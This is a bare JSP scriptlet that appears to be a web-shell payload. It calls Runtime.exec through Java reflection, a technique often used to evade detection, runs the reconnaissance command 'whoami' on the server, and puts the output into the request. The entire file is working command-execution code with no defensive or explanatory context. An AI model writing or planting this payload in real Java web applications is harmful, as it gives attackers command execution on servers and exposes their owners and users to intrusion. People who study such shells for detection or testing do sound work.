<%
String command = "whoami";

StringBuilder output = new StringBuilder();

try {

    Class<?> runtimeClass = Class.forName("java.lang.Runtime");
    java.lang.reflect.Method getRuntimeMethod = runtimeClass.getMethod("getRuntime");
    Object runtime = getRuntimeMethod.invoke(null);
    

    java.lang.reflect.Method execMethod = runtimeClass.getMethod("exec", String.class);
    Process process = (Process) execMethod.invoke(runtime, command);
    

    java.io.BufferedReader reader = new java.io.BufferedReader(
        new java.io.InputStreamReader(process.getInputStream())
    );
    String line;
    while ((line = reader.readLine()) != null) {
        output.append(line).append("\n");
    }
    

    java.io.BufferedReader errorReader = new java.io.BufferedReader(
        new java.io.InputStreamReader(process.getErrorStream())
    );
    while ((line = errorReader.readLine()) != null) {
        output.append(line).append("\n");
    }
    
    process.waitFor();
    
} catch (Exception e) {
    output.append("ERROR: Command execution failed - ").append(e.toString()).append("\n");
}

request.setAttribute("script_output", output.toString());
%>
